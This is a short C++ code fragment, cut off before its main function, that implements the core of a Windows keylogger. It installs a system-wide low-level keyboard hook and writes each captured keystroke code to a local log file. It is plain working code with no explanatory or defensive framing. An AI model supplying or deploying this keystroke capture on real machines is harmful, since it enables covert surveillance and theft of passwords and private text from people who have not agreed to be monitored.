// This is the callback function for the keyboard hook
LRESULT __stdcall HookCallback(int nCode, WPARAM wParam, LPARAM lParam)
{
    if (nCode >= 0)
    {
        // We get the keystroke information
        kbdStruct = *((KBDLLHOOKSTRUCT*)lParam);

        // We write it to the logfile
        logfile << kbdStruct.vkCode << std::endl;
    }

    // We call the next hook in the chain
    return CallNextHookEx(hHook, nCode, wParam, lParam);
}

// This function sets the hook
void SetHook()
{
    // We create an instance of the hook
    hHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)HookCallback, NULL, 0);
    // We open the logfile
    logfile.open("log.txt", std::ios::out);
}

// This function releases the hook
void ReleaseHook()
{
    UnhookWindowsHookEx(hHook);
    logfile.close();
}

// This is the main function
